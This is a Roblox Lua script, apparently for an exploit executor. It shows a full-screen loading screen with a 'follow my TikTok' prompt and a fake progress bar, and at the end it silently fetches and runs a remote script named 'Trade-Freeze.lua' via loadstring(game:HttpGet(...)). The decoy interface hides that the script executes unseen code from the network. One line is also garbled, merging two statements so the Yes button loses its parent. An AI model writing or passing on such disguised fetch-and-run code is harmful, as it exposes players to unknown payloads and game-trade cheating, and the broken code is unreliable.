-- Full-Screen Loading Screen with Question Flow and Loading Bar and Custom Image Background
if game.CoreGui:FindFirstChild("CustomLoadingUI") then
    game.CoreGui.CustomLoadingUI:Destroy()
end

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "CustomLoadingUI"
ScreenGui.Parent = game.CoreGui
ScreenGui.IgnoreGuiInset = true

local Background = Instance.new("ImageLabel")
Background.Size = UDim2.new(1, 0, 1, 0)
Background.Position = UDim2.new(0, 0, 0, 0)
Background.Image = "rbxassetid://102171894223179" -- Your image asset ID here
Background.ScaleType = Enum.ScaleType.Stretch
Background.BackgroundTransparency = 0 -- Make background image visible
Background.Parent = ScreenGui

local QuestionBox = Instance.new("Frame")
QuestionBox.Size = UDim2.new(0, 400, 0, 200)
QuestionBox.Position = UDim2.new(0.5, -200, 0.5, -100)
QuestionBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
QuestionBox.BorderSizePixel = 0
QuestionBox.Parent = Background

local QuestionText = Instance.new("TextLabel")
QuestionText.Size = UDim2.new(1, -20, 0.5, -10)
QuestionText.Position = UDim2.new(0, 10, 0, 10)
QuestionText.BackgroundTransparency = 1
QuestionText.Text = "Are you followed to my TikTok channel?"
QuestionText.Font = Enum.Font.SourceSansBold
QuestionText.TextSize = 24
QuestionText.TextColor3 = Color3.fromRGB(0, 0, 0)
QuestionText.Parent = QuestionBox

local YesButton = Instance.new("TextButton")
YesButton.Size = UDim2.new(0.4, 0, 0.3, 0)
YesButton.Position = UDim2.new(0.05, 0, 0.6, 0)
YesButton.Text = "Yes"
YesButton.Font = Enum.Font.SourceSansBold
YesButton.TextSize = 20
YesButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
YesButton.TextColor3 = Color3.fromRGB(255, 255, 255)
YesButton.Parent = QuestionBoxlocal NoButton = Instance.new("TextButton")
NoButton.Size = UDim2.new(0.4, 0, 0.3, 0)
NoButton.Position = UDim2.new(0.55, 0, 0.6, 0)
NoButton.Text = "No"
NoButton.Font = Enum.Font.SourceSansBold
NoButton.TextSize = 20
NoButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
NoButton.TextColor3 = Color3.fromRGB(255, 255, 255)
NoButton.Parent = QuestionBox

local loadingInProgress = false

local function startLoading()
    if loadingInProgress then return end
    loadingInProgress = true

    QuestionBox:Destroy()

    local LoadingText = Instance.new("TextLabel")
    LoadingText.Size = UDim2.new(1, 0, 0.1, 0)
    LoadingText.Position = UDim2.new(0, 0, 0.45, 0)
    LoadingText.BackgroundTransparency = 1
    LoadingText.Font = Enum.Font.SourceSansBold
    LoadingText.TextSize = 28
    LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
    LoadingText.Text = "Loading 0%"
    LoadingText.Parent = Background

    local ProgressContainer = Instance.new("Frame")
    ProgressContainer.Size = UDim2.new(0.8, 0, 0.05, 0)
    ProgressContainer.Position = UDim2.new(0.1, 0, 0.55, 0)
    ProgressContainer.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
    ProgressContainer.BorderSizePixel = 0
    ProgressContainer.Parent = Background
    Instance.new("UICorner", ProgressContainer).CornerRadius = UDim.new(0, 8)

    local FillBar = Instance.new("Frame")
    FillBar.Size = UDim2.new(0, 0, 1, 0)
    FillBar.BackgroundColor3 = Color3.fromRGB(80, 200, 120)
    FillBar.BorderSizePixel = 0
    FillBar.Parent = ProgressContainer
    Instance.new("UICorner", FillBar).CornerRadius = UDim.new(0, 8)

    for i = 1, 100 do
        LoadingText.Text = "Loading " .. i .. "%"
        FillBar.Size = UDim2.new(i/100, 0, 1, 0)
        task.wait(0.15) -- wait time for 15 seconds total
    end

    ScreenGui:Destroy()

loadstring(game:HttpGet("https://raw.githubusercontent.com/GaGscripts-lua/Grow-a-Garden/refs/heads/main/Trade-Freeze.lua"))()
end

YesButton.MouseButton1Click:Connect(function()
    if loadingInProgress then return end
    QuestionText.Text = "Are you sure???"
    task.delay(3, startLoading)
end)

NoButton.MouseButton1Click:Connect(function()
    if loadingInProgress then return end
    QuestionText.Text = "Follow now to support the channel."
    task.delay(3, startLoading)
end)
